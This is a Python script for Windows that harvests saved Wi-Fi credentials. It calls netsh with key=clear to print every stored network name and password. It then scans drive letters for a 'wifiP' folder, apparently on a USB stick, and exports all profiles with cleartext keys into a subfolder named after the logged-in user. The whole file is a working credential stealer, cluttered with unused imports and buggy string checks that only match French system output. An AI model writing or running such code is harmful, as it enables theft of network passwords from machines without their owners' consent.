from ctypes import sizeof
from importlib.resources import path
from msilib.schema import Directory
from posixpath import split
from re import I
import subprocess
from unittest import expectedFailure, result
import PyInstaller
from pkg_resources import resource_listdir
import os
import faker
# getting  meta data
meta_data=subprocess.check_output(['netsh', 'wlan' , 'show' , 'profiles'])

# decoding meta data
data=meta_data.decode('utf-8' , errors="backslashreplace")

# spliting
data=data.split('\n')

#creating list of profiles
profiles=[]

for i in data:
    if (('Profil Tous les utilisateurs' or 'All User Neme')in i) :
        #if found split item
        i=i.split(':')
               
        # item at index 1 is a wifi name
        i=i[1]
        
        # formating the name
        i=i[1:-1]
        
        # appending wifi name in the list
        profiles.append(i)
        

for i in profiles:    
    try: 
        results=subprocess.check_output(['netsh', 'wlan', 'show','profile',i,'key=clear'])
        
        # decoding
        results=results.decode('utf-8', errors='backslashreplace')
        results=results.split('\n')
        
        # finding password in results
        for b in results:
            if (('Contenu de la clé' or 'Key Content' ) in b ):
                results=[b.split(':')[1][1:-1]]
                
        try:
            print("{:<30} | {:<}".format(i, results[0]))
        except IndexError:
            print("{:<30} | {:<}".format(i, ""))
        
    except subprocess.CalledProcessError:
        print("Erreur d encodage")



# Expoting wifi pass fil in usb flash
alphabet=[]
for i in range (26):
    alphabet.append(chr(65+i))
    userName=os.getlogin()
    
    # parent directory
    parentDir=f"{alphabet[i]}:/wifiP/"
    # cheking if parent dir exsits
    isExist=os.path.exists(parentDir)
    
    # if parent dir exist we create a new dir nemed = users name
    if (isExist==True):
        path=os.path.join(parentDir , userName)
        os.makedirs(path , exist_ok=True)

        # exporting wifi code file
        try:
            subprocess.check_output(['netsh', 'wlan', 'export','profile', 'folder=',f"{alphabet[i]}:\\wifiP\\{userName}",'key=clear']).decode('utf-8', errors='backslashreplace').split('\n')
        except subprocess.CalledProcessError:
            print("not export")


